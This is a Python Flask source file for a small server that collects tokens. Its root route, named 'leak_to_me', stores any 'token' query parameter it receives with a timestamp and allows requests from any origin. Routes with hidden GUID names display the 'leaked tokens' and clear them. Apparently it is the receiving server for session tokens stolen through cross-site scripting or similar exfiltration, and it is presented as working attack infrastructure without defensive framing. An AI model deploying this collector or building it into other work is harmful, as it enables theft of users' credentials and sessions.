import flask
from flask import request
import html
from datetime import datetime

app = flask.Flask(__name__)
app.config["DEBUG"] = False
tokens = {}


def blockprint(my_str, group=80, char='<br />'):
    my_str = str(my_str)
    return my_str
    #return char.join(my_str[i:i+group] for i in range(0, len(my_str), group))

def set_headers_to_response(_resp_obj):
    _resp_obj.headers['Access-Control-Allow-Origin'] = '*'
    _resp_obj.headers['Server'] = ""
    return _resp_obj

@app.route('/', methods=['GET'])
def leak_to_me():
    candidate_token = str(request.args.get('token'))
    if(request.args.get('token') and candidate_token != ""):
        key = str(datetime.now())
        tokens[key[:-4]] = blockprint(html.escape(candidate_token))

    resp_body = flask.Response("")
    return set_headers_to_response(resp_body)

@app.route('/leaked_tokens_24c4d7de-3738-4570-bc19-f33a10924243', methods=['GET'])
def show_leaked_tokens():
    # print(tokens)
    token_table="<tr><th>Timestamp</th><th width=\"80%\">Token</th></tr>\n"

    for timestamp in tokens:
        token_table += "<tr><td>" + timestamp + "</td><td><pre>" + tokens[timestamp] + "</pre></td></tr>\n"

    resp_body = flask.Response('<table border="1">'+token_table+'</table>')
    return set_headers_to_response(resp_body)

@app.route('/delete_all_tokens_763bcc12-bab0-4f98-ae39-737e4a841484', methods=['GET'])
def delete_all_tokens():
    global tokens

    tokens = {}

    resp_body = flask.Response('All tokens cleared from memory!')
    return set_headers_to_response(resp_body)

if __name__ == '__main__':
    from waitress import serve
    serve(app, host="0.0.0.0", port=8181)